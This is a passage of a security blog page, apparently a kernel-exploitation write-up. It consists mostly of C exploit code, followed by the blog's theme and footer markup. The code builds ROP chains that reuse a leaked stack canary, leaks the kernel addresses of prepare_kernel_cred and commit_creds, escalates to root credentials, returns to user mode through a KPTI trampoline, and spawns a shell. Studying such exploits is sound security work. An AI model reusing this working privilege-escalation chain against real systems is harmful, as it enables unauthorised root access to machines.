addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = calculate_addr_prepare_kernel_cred;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[+] prepare_kernel_cred offset saved in eax\n&quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    value_offset = <span class="number">0</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov value_offset, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,value_offset);</span><br><span class="line">    addr_prepare_kernel_cred = addr_ksymtab_prepare_kernel_cred - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - value_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_prepare_kernel_cred: %p\n&quot;</span>,addr_prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_prepare_kernel_cred calculated\n&quot;</span>);</span><br><span class="line">    leak_commit_creds();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking commit_creds offset&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rax_ret;</span><br><span class="line">    payload[offset++] = addr_ksymtab_commit_creds;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = addr_deref_rax_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0xdeadbeef</span>;  <span class="comment">//rbp </span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = calculate_addr_commit_creds;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[*] overflow &quot;);</span></span><br><span class="line">    <span class="comment">// puts(&quot;[+] commit_creds offset saved in eax\n&quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    value_offset = <span class="number">0</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov value_offset,eax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,value_offset);</span><br><span class="line">    addr_commit_creds = addr_ksymtab_commit_creds - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - value_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_commit_creds: %p\n&quot;</span>,addr_commit_creds);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_commit_creds calculated\n&quot;</span>);</span><br><span class="line">    execute_prepare_kernel_cred();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] executing prepare_kernel_cred&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = addr_prepare_kernel_cred;  <span class="comment">//ret in rax</span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = save_init_task_cred;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_init_task_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov addr_init_task_cred,rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,addr_init_task_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init task_cred address: %p\n&quot;</span>,addr_init_task_cred);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_init_task_cred saved\n\n&quot;</span>);</span><br><span class="line">    execute_commit_creds();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] executing commit_creds&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = addr_init_task_cred;</span><br><span class="line">    payload[offset++] = addr_commit_creds;  <span class="comment">//ret in rax</span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = spawn_shell;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[*] overflow &quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><span class="page-number current">2</span><a class="page-number" href="/impossible/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/11/">11</a><a class="extend next" rel="next" href="/impossible/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
